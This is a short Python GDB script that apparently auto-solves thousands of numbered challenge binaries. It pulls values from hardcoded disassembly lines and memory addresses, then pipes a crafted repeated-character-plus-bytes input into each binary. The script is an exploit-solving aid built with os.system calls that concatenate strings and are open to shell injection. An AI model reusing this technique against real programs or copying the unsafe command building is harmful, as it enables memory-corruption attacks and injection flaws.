import gdb,os
def main(i):
    try:
        gdb.execute('file '+str(i)+'.bin')
        xy=gdb.execute('info file',to_string=True)
        if "elf32" in xy:
            print("file : ",i,".bin")
            print("Arch :  ELF 32-bit LSB")
            x=gdb.execute('disas 0x00000510,0x00000834',to_string=True).split('\n')[117].split(',')[-1]
            y=gdb.execute('disas 0x00000510,0x00000834',to_string=True).split('\n')[118].split(',')[-1]
            gdb.execute('file '+str(i)+'.bin')
            gdb.execute('r < temperoryStorage')
            xyz=gdb.execute('x/4bx 0x56557008',to_string=True).split(':')[1].replace('\t','').replace('\n','').replace(' ','').replace('0x','\\x')
        else:
            print("file: ",i,".bin")
            print("ELF 64-bit LSB")
            x=gdb.execute('disas 0x0000000000000700,0x00000000000009c2',to_string=True).split('\n')[74].split(',')[-1]
            y=gdb.execute('disas 0x0000000000000700,0x00000000000009c2',to_string=True).split('\n')[75].split(',')[-1]
            gdb.execute('file '+str(i)+'.bin')
            gdb.execute('r < temperoryStorage')
            xyz=gdb.execute('x/8bx 0x555555755010',to_string=True).split(':')[1].replace('\t','').replace('\n','').replace(' ','').replace('0x','\\x')
    except:
        print("brrrrrrrrrrrrrrrrrrrr")
    
    chars,num=chr(int(y,16)),int(x,16)
    final=chars*num
    print("final:",final,"XYZ:",xyz)
    os.system('python -c print"\''+final+'\'+\''+xyz+'\'" > Pass')
    os.system('./'+str(i)+'.bin < Pass')
    gdb.execute('quit')

for i in range(1,3001):
    main(i)